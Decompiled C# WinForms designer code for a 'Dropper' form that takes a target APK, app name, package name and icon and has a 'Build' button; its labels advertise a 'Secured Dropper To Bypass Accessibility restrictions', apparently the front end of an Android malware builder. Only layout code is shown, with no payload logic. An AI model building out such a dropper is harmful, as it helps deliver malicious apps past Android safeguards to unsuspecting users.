// Token: 0x0200006D RID: 109
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class Drooper : global::System.Windows.Forms.Form
{
	// Token: 0x06000519 RID: 1305 RVA: 0x0007F480 File Offset: 0x0007D680
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x0600051A RID: 1306 RVA: 0x0007F4C4 File Offset: 0x0007D6C4
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.DrakeUISymbolLabel1 = new global::DrakeUI.Framework.DrakeUISymbolLabel();
		this.Panel1 = new global::System.Windows.Forms.Panel();
		this.selectapkbtn = new global::System.Windows.Forms.Button();
		this.TapkText = new global::DrakeUI.Framework.DrakeUITextBox();
		this.BackgroundWorker1 = new global::System.ComponentModel.BackgroundWorker();
		this.apkicon = new global::System.Windows.Forms.PictureBox();
		this.Panel2 = new global::System.Windows.Forms.Panel();
		this.labelid = new global::System.Windows.Forms.Label();
		this.labelname = new global::System.Windows.Forms.Label();
		this.textpkgname = new global::DrakeUI.Framework.DrakeUITextBox();
		this.textappname = new global::DrakeUI.Framework.DrakeUITextBox();
		this.Button1 = new global::System.Windows.Forms.Button();
		this.Button2 = new global::System.Windows.Forms.Button();
		this.logtext = new global::System.Windows.Forms.RichTextBox();
		this.WorkWorker = new global::System.ComponentModel.BackgroundWorker();
		this.drakeUISymbolLabel2 = new global::DrakeUI.Framework.DrakeUISymbolLabel();
		this.Panel1.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.apkicon).BeginInit();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.DrakeUISymbolLabel1.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.DrakeUISymbolLabel1.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.DrakeUISymbolLabel1.ForeColor = global::System.Drawing.Color.Lime;
		this.DrakeUISymbolLabel1.Location = new global::System.Drawing.Point(0, 0);
		this.DrakeUISymbolLabel1.Margin = new global::System.Windows.Forms.Padding(2);
		this.DrakeUISymbolLabel1.Name = "DrakeUISymbolLabel1";
		this.DrakeUISymbolLabel1.Padding = new global::System.Windows.Forms.Padding(28, 0, 0, 0);
		this.DrakeUISymbolLabel1.Size = new global::System.Drawing.Size(525, 28);
		this.DrakeUISymbolLabel1.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUISymbolLabel1.Symbol = 61832;
		this.DrakeUISymbolLabel1.SymbolColor = global::System.Drawing.Color.Lime;
		this.DrakeUISymbolLabel1.TabIndex = 1;
		this.DrakeUISymbolLabel1.Text = "Secured Dropper To Bypass restrictions";
		this.DrakeUISymbolLabel1.Click += new global::System.EventHandler(this.DrakeUISymbolLabel1_Click);
		this.Panel1.Controls.Add(this.selectapkbtn);
		this.Panel1.Controls.Add(this.TapkText);
		this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new global::System.Drawing.Point(0, 28);
		this.Panel1.Margin = new global::System.Windows.Forms.Padding(2);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new global::System.Drawing.Size(525, 81);
		this.Panel1.TabIndex = 2;
		this.selectapkbtn.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.selectapkbtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.selectapkbtn.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.selectapkbtn.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.selectapkbtn.Location = new global::System.Drawing.Point(422, 23);
		this.selectapkbtn.Margin = new global::System.Windows.Forms.Padding(2);
		this.selectapkbtn.Name = "selectapkbtn";
		this.selectapkbtn.Size = new global::System.Drawing.Size(91, 35);
		this.selectapkbtn.TabIndex = 47;
		this.selectapkbtn.Text = "Select Apk";
		this.selectapkbtn.UseVisualStyleBackColor = true;
		this.selectapkbtn.Click += new global::System.EventHandler(this.Selectapkbtn_Click);
		this.TapkText.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.TapkText.Enabled = false;
		this.TapkText.FillColor = global::System.Drawing.Color.Black;
		this.TapkText.FillDisableColor = global::System.Drawing.Color.Black;
		this.TapkText.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.TapkText.ForeColor = global::System.Drawing.Color.White;
		this.TapkText.ForeDisableColor = global::System.Drawing.Color.White;
		this.TapkText.Location = new global::System.Drawing.Point(8, 28);
		this.TapkText.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.TapkText.Maximum = 2147483647.0;
		this.TapkText.Minimum = -2147483648.0;
		this.TapkText.Name = "TapkText";
		this.TapkText.Padding = new global::System.Windows.Forms.Padding(5);
		this.TapkText.Radius = 10;
		this.TapkText.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.TapkText.RectDisableColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.TapkText.Size = new global::System.Drawing.Size(404, 27);
		this.TapkText.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.TapkText.StyleCustomMode = true;
		this.TapkText.TabIndex = 46;
		this.TapkText.TextAlignment = global::System.Drawing.ContentAlignment.TopLeft;
		this.TapkText.Watermark = "Target Apk";
		this.BackgroundWorker1.DoWork += new global::System.ComponentModel.DoWorkEventHandler(this.BackgroundWorker1_DoWork);
		this.apkicon.Location = new global::System.Drawing.Point(419, 5);
		this.apkicon.Margin = new global::System.Windows.Forms.Padding(2);
		this.apkicon.Name = "apkicon";
		this.apkicon.Size = new global::System.Drawing.Size(94, 80);
		this.apkicon.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.apkicon.TabIndex = 3;
		this.apkicon.TabStop = false;
		this.Panel2.Controls.Add(this.labelid);
		this.Panel2.Controls.Add(this.labelname);
		this.Panel2.Controls.Add(this.textpkgname);
		this.Panel2.Controls.Add(this.textappname);
		this.Panel2.Controls.Add(this.apkicon);
		this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new global::System.Drawing.Point(0, 109);
		this.Panel2.Margin = new global::System.Windows.Forms.Padding(2);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new global::System.Drawing.Size(525, 90);
		this.Panel2.TabIndex = 4;
		this.labelid.AutoSize = true;
		this.labelid.Font = new global::System.Drawing.Font("Calibri", 10f);
		this.labelid.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.labelid.Location = new global::System.Drawing.Point(69, 47);
		this.labelid.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelid.Name = "labelid";
		this.labelid.Size = new global::System.Drawing.Size(92, 17);
		this.labelid.TabIndex = 50;
		this.labelid.Text = "Package Name";
		this.labelname.AutoSize = true;
		this.labelname.Font = new global::System.Drawing.Font("Calibri", 10f);
		this.labelname.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.labelname.Location = new global::System.Drawing.Point(99, 7);
		this.labelname.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelname.Name = "labelname";
		this.labelname.Size = new global::System.Drawing.Size(67, 17);
		this.labelname.TabIndex = 49;
		this.labelname.Text = "App Name";
		this.textpkgname.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.textpkgname.FillColor = global::System.Drawing.Color.Black;
		this.textpkgname.FillDisableColor = global::System.Drawing.Color.Black;
		this.textpkgname.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.textpkgname.ForeColor = global::System.Drawing.Color.White;
		this.textpkgname.ForeDisableColor = global::System.Drawing.Color.White;
		this.textpkgname.Location = new global::System.Drawing.Point(188, 43);
		this.textpkgname.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.textpkgname.Maximum = 2147483647.0;
		this.textpkgname.Minimum = -2147483648.0;
		this.textpkgname.Name = "textpkgname";
		this.textpkgname.Padding = new global::System.Windows.Forms.Padding(5);
		this.textpkgname.Radius = 10;
		this.textpkgname.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.textpkgname.RectDisableColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.textpkgname.Size = new global::System.Drawing.Size(190, 27);
		this.textpkgname.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.textpkgname.StyleCustomMode = true;
		this.textpkgname.TabIndex = 48;
		this.textpkgname.TextAlignment = global::System.Drawing.ContentAlignment.TopLeft;
		this.textpkgname.Watermark = "package name";
		this.textappname.Cursor = global::System.Windows.Forms.Cursors.IBeam;
		this.textappname.FillColor = global::System.Drawing.Color.Black;
		this.textappname.FillDisableColor = global::System.Drawing.Color.Black;
		this.textappname.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.textappname.ForeColor = global::System.Drawing.Color.White;
		this.textappname.ForeDisableColor = global::System.Drawing.Color.White;
		this.textappname.Location = new global::System.Drawing.Point(188, 7);
		this.textappname.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
		this.textappname.Maximum = 2147483647.0;
		this.textappname.Minimum = -2147483648.0;
		this.textappname.Name = "textappname";
		this.textappname.Padding = new global::System.Windows.Forms.Padding(5);
		this.textappname.Radius = 10;
		this.textappname.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.textappname.RectDisableColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.textappname.Size = new global::System.Drawing.Size(190, 27);
		this.textappname.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.textappname.StyleCustomMode = true;
		this.textappname.TabIndex = 47;
		this.textappname.TextAlignment = global::System.Drawing.ContentAlignment.TopLeft;
		this.textappname.Watermark = "App Name";
		this.Button1.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button1.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.Button1.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.Button1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
		this.Button1.Location = new global::System.Drawing.Point(419, 203);
		this.Button1.Margin = new global::System.Windows.Forms.Padding(2);
		this.Button1.Name = "Button1";
		this.Button1.Size = new global::System.Drawing.Size(101, 26);
		this.Button1.TabIndex = 48;
		this.Button1.Text = "icon";
		this.Button1.UseVisualStyleBackColor = true;
		this.Button1.Click += new global::System.EventHandler(this.Button1_Click);
		this.Button2.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button2.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
		this.Button2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.Button2.Font = new global::System.Drawing.Font("Calibri", 12f);
		this.Button2.ForeColor = global::System.Drawing.Color.Lime;
		this.Button2.Location = new global::System.Drawing.Point(89, 381);
		this.Button2.Margin = new global::System.Windows.Forms.Padding(2);
		this.Button2.Name = "Button2";
		this.Button2.Size = new global::System.Drawing.Size(323, 51);
		this.Button2.TabIndex = 49;
		this.Button2.Text = "Build";
		this.Button2.UseVisualStyleBackColor = true;
		this.Button2.Click += new global::System.EventHandler(this.Button2_Click);
		this.logtext.BackColor = global::System.Drawing.Color.Black;
		this.logtext.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
		this.logtext.Font = new global::System.Drawing.Font("Calibri", 11.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.logtext.ForeColor = global::System.Drawing.Color.Lime;
		this.logtext.Location = new global::System.Drawing.Point(0, 233);
		this.logtext.Margin = new global::System.Windows.Forms.Padding(2);
		this.logtext.Name = "logtext";
		this.logtext.ReadOnly = true;
		this.logtext.Size = new global::System.Drawing.Size(520, 144);
		this.logtext.TabIndex = 51;
		this.logtext.Text = "";
		this.WorkWorker.DoWork += new global::System.ComponentModel.DoWorkEventHandler(this.WorkWorker_DoWork);
		this.drakeUISymbolLabel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
		this.drakeUISymbolLabel2.Font = new global::System.Drawing.Font("Bahnschrift SemiBold", 14.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
		this.drakeUISymbolLabel2.ForeColor = global::System.Drawing.Color.Lime;
		this.drakeUISymbolLabel2.Location = new global::System.Drawing.Point(0, 453);
		this.drakeUISymbolLabel2.Margin = new global::System.Windows.Forms.Padding(2);
		this.drakeUISymbolLabel2.Name = "drakeUISymbolLabel2";
		this.drakeUISymbolLabel2.Padding = new global::System.Windows.Forms.Padding(28, 0, 0, 0);
		this.drakeUISymbolLabel2.Size = new global::System.Drawing.Size(525, 28);
		this.drakeUISymbolLabel2.Style = global::DrakeUI.Framework.UIStyle.Custom;
		this.drakeUISymbolLabel2.Symbol = 62106;
		this.drakeUISymbolLabel2.SymbolColor = global::System.Drawing.Color.Lime;
		this.drakeUISymbolLabel2.TabIndex = 52;
		this.drakeUISymbolLabel2.Text = "Secured Dropper To Bypass Accessibility restrictions";
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.Color.Black;
		base.ClientSize = new global::System.Drawing.Size(525, 481);
		base.Controls.Add(this.drakeUISymbolLabel2);
		base.Controls.Add(this.Button1);
		base.Controls.Add(this.Button2);
		base.Controls.Add(this.logtext);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.DrakeUISymbolLabel1);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Margin = new global::System.Windows.Forms.Padding(2);
		this.MaximumSize = new global::System.Drawing.Size(541, 520);
		this.MinimumSize = new global::System.Drawing.Size(541, 520);
		base.Name = "Drooper";
		base.ShowIcon = false;
		this.Text = "Dropper";
		this.Panel1.ResumeLayout(false);
		((global::System.ComponentModel.ISupportInitialize)this.apkicon).EndInit();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		base.ResumeLayout(false);
	}

	// Token: 0x040006DB RID: 1755
	private global::System.ComponentModel.IContainer components;

	// Token: 0x04000708 RID: 1800
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal global::DrakeUI.Framework.DrakeUISymbolLabel DrakeUISymbolLabel1;

	// Token: 0x04000709 RID: 1801
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel1")]
	internal global::System.Windows.Forms.Panel Panel1;

	// Token: 0x0400070A RID: 1802
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("TapkText")]
	internal global::DrakeUI.Framework.DrakeUITextBox TapkText;

	// Token: 0x0400070B RID: 1803
	internal global::System.ComponentModel.BackgroundWorker BackgroundWorker1;

	// Token: 0x0400070C RID: 1804
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("apkicon")]
	internal global::System.Windows.Forms.PictureBox apkicon;

	// Token: 0x0400070D RID: 1805
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel2")]
	internal global::System.Windows.Forms.Panel Panel2;

	// Token: 0x0400070E RID: 1806
	internal global::System.Windows.Forms.Button selectapkbtn;

	// Token: 0x0400070F RID: 1807
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("labelid")]
	internal global::System.Windows.Forms.Label labelid;

	// Token: 0x04000710 RID: 1808
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("labelname")]
	internal global::System.Windows.Forms.Label labelname;

	// Token: 0x04000711 RID: 1809
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("textpkgname")]
	internal global::DrakeUI.Framework.DrakeUITextBox textpkgname;

	// Token: 0x04000712 RID: 1810
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("textappname")]
	internal global::DrakeUI.Framework.DrakeUITextBox textappname;

	// Token: 0x04000713 RID: 1811
	internal global::System.Windows.Forms.Button Button1;

	// Token: 0x04000714 RID: 1812
	internal global::System.Windows.Forms.Button Button2;

	// Token: 0x04000715 RID: 1813
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("logtext")]
	internal global::System.Windows.Forms.RichTextBox logtext;

	// Token: 0x04000716 RID: 1814
	internal global::DrakeUI.Framework.DrakeUISymbolLabel drakeUISymbolLabel2;

	// Token: 0x04000717 RID: 1815
	internal global::System.ComponentModel.BackgroundWorker WorkWorker;
}
